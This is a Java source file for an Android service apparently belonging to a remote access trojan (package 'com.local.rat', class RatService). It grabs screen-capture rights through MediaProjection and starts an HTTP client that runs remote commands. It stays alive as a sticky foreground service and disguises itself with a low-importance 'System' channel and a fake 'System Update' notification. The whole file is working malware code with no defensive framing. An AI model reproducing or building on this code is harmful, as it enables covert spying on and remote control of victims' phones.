package com.local.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;

public class RatService extends Service {
    public static final String ACTION_START = "com.local.rat.START";
    public static final String EXTRA_RESULT_CODE = "rc";
    public static final String EXTRA_RESULT_DATA = "rd";

    public static volatile MediaProjection projection;
    public static volatile Commands commands;
    private HttpClient client;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        AppCtx.init(this);

        if (intent != null && ACTION_START.equals(intent.getAction())) {
            int rc = intent.getIntExtra(EXTRA_RESULT_CODE, -1);
            Intent rd = intent.getParcelableExtra(EXTRA_RESULT_DATA);
            if (rc != -1 && rd != null) {
                MediaProjectionManager mpm =
                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                if (mpm != null) {
                    projection = mpm.getMediaProjection(rc, rd);
                    if (projection != null) {
                        projection.registerCallback(new MediaProjection.Callback() {
                            @Override public void onStop() { projection = null; }
                        }, null);
                    }
                }
            }
            startForeground(1, buildNotification());
            commands = new Commands(this);
            if (client == null) {
                client = new HttpClient(commands);
                client.start();
            }
        }
        return START_STICKY;
    }

    private Notification buildNotification() {
        String ch = "svc";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(
                    new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        return b.setContentTitle("System Update")
                .setContentText("Service running")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setOngoing(true)
                .build();
    }

    @Override public void onDestroy() {
        if (client != null) client.stop();
        super.onDestroy();
    }
    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
}
